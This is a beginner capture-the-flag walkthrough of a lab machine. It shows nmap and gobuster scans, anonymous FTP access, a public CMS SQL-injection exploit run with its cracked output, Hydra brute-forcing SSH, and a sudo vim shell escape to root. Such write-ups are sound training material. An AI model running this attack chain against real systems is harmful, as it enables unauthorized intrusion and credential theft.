# Simple CTF

Beginner level ctf

## 1. How many services are running under port 1000?
- Scan using nmap, `nmap -sC -sV -p0-3000 --min-rate 700 -oN ports 10.10.95.145`
```
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
```

## 2. What is running on the higher port?
- It's obvious. Look at the nmap result

## 3. What's the CVE you're using against the application?
- The CVE of some kind of web application related stuff running on the target. Use gobuster to find out the directory of the application
- `gobuster dir -u http://10.10.95.145/ -w /usr/share/wordlists/dirb/common.txt`
```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.95.145/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/17 15:08:26 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2020/09/17 15:12:17 Finished
```

## 4. To what kind of vulnerability is the application vulnerable?
- The technique used in the CVE mentioned.

## 5. What's the password?
- Look back at nmap result and we can see that SSH protocol open on certain port.
- But before we know the password, don't forget the username.
	- Look back at the nmap result, we can see FTP protocol open on certain port and it shows anonymous login are allowed.
	```
	ftp-anon: Anonymous FTP login allowed (FTP code 230)
	```
	- We can leverage this to login through FTP using `anonymous` as username
	- Login successful! 
	```
	ftp > ls
	200 PORT command successful. Consider using PASV.
	150 Here comes the directory listing.
	drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
	226 Directory send OK.
	```
	- Go to the pub directory and retrieve the file inside using `get` command. There are clues about the username.

- There are few techniques that can be used to obtain the password:
	- The technique in the CVE. Download the exploit code and use it. I use Python 3 instead of Python 2 because Python 2 lacking some library necessary on my Kali. Just make sure to install all the necessary library required for the exploit code and know how to troubleshoot the code if any errors come up. This will save us from a lot of headache.
	```
	$ python3 cms-sqli.py -u http://10.10.95.145/simple/ --crack -w /usr/share/dirb/wordlists/others/best110.txt
	[+] Salt for password found: 1dac0d92e9fa6bb2
	[+] Username found: mitch
	[+] Email found: admin@admin.com
	[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
	```
	- Password cracking using Hydra
	```
	$ hydra -l mitch -P /root/rockyou.txt ssh://10.10.60.23:2222
	Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
	
	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-17 21:39:00
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
	[DATA] attacking ssh://10.10.60.23:2222/
	[2222][ssh] host: 10.10.60.23   login: mitch   password: secret
	1 of 1 target successfully completed, 1 valid password found
	```
	- Run `ssh mitch@10.10.60.23 -p 2222` to login.

## 6. Where can you login with the details obtained?
- It's obvious, what is the protocol used before this to login?

## 7. What's the user flag?
- Flag in the user.txt file located in the target system

## 8. Is there any other user in the home directory? What's its name?
- Just don't forget to look at `/etc/passwd` file. It's there.

## 9. What can you leverage to spawn a privileged shell?
- Find out what binary program that can be run by the user as administrator. 
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
- Run `sudo -l` shows that Vim can be run as admin.
- It's the right time to run the Vim and escalate out privileges by spawning the shell.
- Run `sudo vim test` to create test file with admin access.
- Inside the Vim press `i` to enter insert mode. Type `:!sh` or `:!bash`. Press `Esc` and save the file by typing `:wq`. BOOM!
	```
	# id
	uid=0(root) gid=0(root) groups=0(root)
	# whoami
	root
	# locate root.txt
	/root/root.txt
	# cd /root
	# cat root.txt
	```

## 10. What's the root flag?
- Flag in the root.txt file that can only be read by root (admin)
